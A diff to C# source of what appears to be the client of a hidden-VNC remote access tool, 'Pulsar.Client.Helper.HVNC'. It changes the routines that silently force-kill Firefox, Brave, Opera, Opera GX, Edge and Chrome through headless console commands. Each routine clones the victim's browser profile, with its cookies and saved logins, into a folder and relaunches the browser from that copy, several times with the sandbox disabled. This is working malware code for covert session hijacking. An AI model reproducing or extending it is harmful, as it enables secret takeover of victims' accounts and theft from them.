@@ -99,165 +99,193 @@ namespace Pulsar.Client.Helper.HVNC
 
         public void StartFirefox()
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
-
-            if (!Directory.Exists(path))
+            try
             {
-                return;
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
+
+                if (!Directory.Exists(path))
+                {
+                    return;
+                }
+
+                string sourceDir = Path.Combine(path, "Profiles");
+                if (!Directory.Exists(sourceDir))
+                {
+                    return;
+                }
+
+                string text = Path.Combine(path, "fudasf");
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(filePath);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.StartFirefox();
+                    return;
+                }
+
+                string filePath2 = "Conhost --headless cmd.exe /c start firefox --profile=\"" + text + "\"";
+                this.CreateProc(filePath2);
             }
-
-            //string sourceDir = Path.Combine(path, "Profiles");
-
-            //if (!Directory.Exists(sourceDir))
-            //{
-            //    return;
-            //}
-
-            //string text = Path.Combine(path, "SecureFolder");
-            //string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
-            //if (!Directory.Exists(text))
-            //{
-            //    this.CreateProc(filePath);
-            //    Directory.CreateDirectory(text);
-            //    this.CloneDirectory(sourceDir, text);
-            //}
-            //else
-            //{
-            //    DeleteFolder(text);
-            //    this.StartFirefox();
-            //}
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
-            this.CreateProc(killCommand);
-            Thread.Sleep(1000);
-            string filePath2 = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote";
-            this.CreateProc(filePath2);
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Error starting Firefox: " + ex.Message);
+            }
         }
-
 
         public void StartBrave()
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
-
-            if (!Directory.Exists(path))
+            try
             {
-                return;
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
+
+                if (!Directory.Exists(path))
+                {
+                    return;
+                }
+
+                string sourceDir = Path.Combine(path, "User Data");
+                if (!Directory.Exists(sourceDir))
+                {
+                    return;
+                }
+
+                string text = Path.Combine(path, "fudasf");
+                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
+
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(killCommand);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.StartBrave();
+                    return;
+                }
+
+                string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"" + text + "\"";
+                this.CreateProc(startCommand);
             }
-
-            //string sourceDir = Path.Combine(path, "User Data");
-
-            //if (!Directory.Exists(sourceDir))
-            //{
-            //    return;
-            //}
-
-            //string secureFolder = Path.Combine(path, "SecureFolder");
-            //string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-
-            //if (!Directory.Exists(secureFolder))
-            //{
-            //    this.CreateProc(killCommand);
-            //    Directory.CreateDirectory(secureFolder);
-            //    this.CloneDirectory(sourceDir, secureFolder);
-            //}
-            //else
-            //{
-            //    DeleteFolder(secureFolder);
-            //    this.StartBrave();
-            //}
-
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-            this.CreateProc(killCommand);
-            Thread.Sleep(1000);
-            string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
-            this.CreateProc(startCommand);
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Error starting Brave: " + ex.Message);
+            }
         }
 
         public void StartOpera()
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\";
-            if (!Directory.Exists(path)) return;
+            try
+            {
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\";
+                if (!Directory.Exists(path)) return;
 
-            //string sourceDir = path;
-            //string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
-            //string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
+                string sourceDir = path;
+                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
+                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
 
-            //this.CreateProc(killCommand);
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(killCommand);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.StartOpera();
+                    return;
+                }
 
-            //if (Directory.Exists(secureFolder))
-            //{
-            //    DeleteFolder(secureFolder);
-            //}
-
-            //Directory.CreateDirectory(secureFolder);
-            //this.CloneDirectory(sourceDir, secureFolder);
-
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
-            this.CreateProc(killCommand);
-            Thread.Sleep(1000);
-            string startCommand = "Conhost --headless cmd.exe /c start opera.exe";
-            this.CreateProc(startCommand);
+                string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + text + "\"";
+                this.CreateProc(startCommand);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Error starting Opera: " + ex.Message);
+            }
         }
 
         public void StartOperaGX()
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
-            if (!Directory.Exists(path)) return;
+            try
+            {
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
+                if (!Directory.Exists(path)) return;
 
-            //string sourceDir = path;
-            //string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
-            //string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
+                string sourceDir = path;
+                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
+                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
 
-            //this.CreateProc(killCommand);
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(killCommand);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.StartOperaGX();
+                    return;
+                }
 
-            //if (Directory.Exists(secureFolder))
-            //{
-            //    DeleteFolder(secureFolder);
-            //}
-
-            //Directory.CreateDirectory(secureFolder);
-            //this.CloneDirectory(sourceDir, secureFolder);
-
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
-            this.CreateProc(killCommand);
-            Thread.Sleep(1000);
-            string startCommand = "Conhost --headless cmd.exe /c start operagx.exe";
-            this.CreateProc(startCommand);
+                string startCommand = "Conhost --headless cmd.exe /c start operagx.exe --user-data-dir=\"" + text + "\"";
+                this.CreateProc(startCommand);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Error starting OperaGX: " + ex.Message);
+            }
         }
 
         public void StartEdge()
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
-
-            if (!Directory.Exists(path))
+            try
             {
-                return;
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
+
+                if (!Directory.Exists(path))
+                {
+                    return;
+                }
+
+                string sourceDir = Path.Combine(path, "User Data");
+                if (!Directory.Exists(sourceDir))
+                {
+                    return;
+                }
+
+                string text = Path.Combine(path, "fudasf");
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
+
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(filePath);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.StartEdge();
+                    return;
+                }
+
+                string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"" + text + "\"";
+                this.CreateProc(filePath2);
             }
-
-            //string sourceDir = Path.Combine(path, "User Data");
-
-            //if (!Directory.Exists(sourceDir))
-            //{
-            //    return;
-            //}
-
-            //string text = Path.Combine(path, "SecureFolder");
-            //string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
-            //if (!Directory.Exists(text))
-            //{
-            //    this.CreateProc(filePath);
-            //    Directory.CreateDirectory(text);
-            //    this.CloneDirectory(sourceDir, text);
-            //}
-            //else
-            //{
-            //    DeleteFolder(text);
-            //    this.StartEdge();
-            //}
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
-            this.CreateProc(killCommand);
-            Thread.Sleep(1000);
-            string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
-            this.CreateProc(filePath2);
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Error starting Edge: " + ex.Message);
+            }
         }
 
         public void Startchrome()
@@ -271,24 +299,22 @@ namespace Pulsar.Client.Helper.HVNC
                     return;
                 }
 
-                //string sourceDir = Path.Combine(path, "User Data");
-                //string text = Path.Combine(path, "SecureFolder");
-                //string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                //if (!Directory.Exists(text))
-                //{
-                //    Directory.CreateDirectory(text);
-                //    this.CreateProc(filePath);
-                //    this.CloneDirectory(sourceDir, text);
-                //}
-                //else
-                //{
-                //    DeleteFolder(text);
-                //    this.Startchrome();
-                //}
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                this.CreateProc(killCommand);
-                Thread.Sleep(1000);
-                string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
+                string sourceDir = Path.Combine(path, "User Data");
+                string text = Path.Combine(path, "fudasf");
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
+                if (!Directory.Exists(text))
+                {
+                    Directory.CreateDirectory(text);
+                    this.CreateProc(filePath);
+                    this.CloneDirectory(sourceDir, text);
+                }
+                else
+                {
+                    DeleteFolder(text);
+                    this.Startchrome();
+                }
+
+                string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-dir=\"" + text + "\"";
                 this.CreateProc(filePath2);
             }
             catch (Exception ex)
@@ -298,7 +324,6 @@ namespace Pulsar.Client.Helper.HVNC
             }
             return;
         }
-
 
         public void StartDiscord()
         {
